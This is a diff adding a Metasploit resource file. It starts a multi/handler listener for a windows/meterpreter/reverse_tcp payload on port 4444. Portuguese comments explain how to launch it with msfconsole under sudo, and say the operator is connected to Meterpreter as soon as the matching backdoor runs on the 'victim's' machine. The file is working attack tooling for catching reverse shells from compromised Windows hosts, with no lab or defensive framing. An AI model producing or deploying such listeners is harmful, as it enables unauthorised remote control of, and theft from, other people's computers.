@@ -1,0 +1,11 @@
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 000.000.00.0
+set lport 4444
+exploit -Z
+
+
+# o uso desse arquivo , acelera o processo de conexão
+# importante que a porta especificado , seja a mesma presente no arquivo do backdoor e o ip e da sua maquina local
+# para rodalo , rode o seguinte comando (como sudo) -> msfconsole -r meterpreter.rc 
+# ele rodara todos os comando e se o backdoor foi executado na maquina da vitima, você já vai estar conectado no meterpreter
